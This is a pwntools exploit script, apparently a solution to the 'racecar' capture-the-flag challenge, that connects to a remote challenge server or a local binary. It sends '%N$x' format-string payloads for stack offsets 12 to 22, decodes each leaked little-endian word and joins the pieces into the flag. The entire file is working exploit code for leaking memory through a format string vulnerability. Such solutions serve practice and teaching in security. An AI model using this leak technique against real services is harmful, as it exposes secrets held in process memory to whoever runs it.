# Format string vuln, flag is printed on the stack

from pwn import *

elf = context.binary = ELF('./racecar', checksec=False)
context.log_level = 'error'

gs = '''
c
'''

flag_parts = []

def start():
	if args.REMOTE:
		return remote("94.237.57.211", 42192)
	elif args.GDB:
		return gdb.debug(elf.path, gdbscript=gs)
	else:
		return process(elf.path)

## Flag is printed starting at 12th arg, using %x

def exploit():

	try:
		for i in range(12, 23):

			io = start()

			payload = f'%{i}$x'

			io.recvuntil(b'Name: ',)
			io.sendline(b'Salman Jamil')

			io.recvuntil(b'Nickname: ')
			io.sendline(b'Jamil')

			io.recvuntil(b'> ')
			io.sendline(b'2')

			io.recvuntil(b'> ')
			io.sendline(b'1')

			io.recvuntil(b'> ')
			io.sendline(b'2')

			io.recvuntil(b'> ')
			io.sendline(payload)

			io.recvuntil(b'this:')
			io.recvline()
			response = io.recv().strip().decode('utf-8')

			response_unhexed = unhex(response)

			response_big_endian = response_unhexed[::-1]

			print(f'{i}: {response_big_endian}')

			flag_parts.append(response_big_endian.decode())

			io.close()
	except:
		print("Something went wrong")

	else:
		full_flag = ''.join(flag_parts)
		print(f'Full flag: {full_flag}')



if __name__ == "__main__":
	exploit()